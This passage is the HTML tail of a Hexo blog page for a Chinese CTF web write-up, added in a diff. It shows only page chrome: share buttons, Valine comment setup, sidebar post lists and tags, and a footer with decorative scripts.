+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/3830.html";
+            const title         = "「羊城杯2024web方向题解与复现」";
+            const excerpt       = `8.27偶遇粤港澳大湾区羊城杯，全是知识盲区强如战神，拼尽全力无法战胜。`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-09-09T10:58:26.760Z" itemprop="dateModified">最后编辑：2024-09-09</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Secret" href="/posts/17365.html">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" 真正的from LFI to RCE——CVE-2024-2961" href="/posts/28510.html">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/3830.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                75
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                14
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/28510.html"><i class="fa  fa-book"></i> 真正的from LFI to RCE——CVE-2024-2961</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/3830.html"><i class="fa  fa-book"></i> 羊城杯2024web方向题解与复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/17365.html"><i class="fa  fa-book"></i> Secret</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/25143.html"><i class="fa  fa-book"></i> 巅峰极客2024部分题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/12526.html"><i class="fa  fa-book"></i> TFCCTF2024 web方向部分题解</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
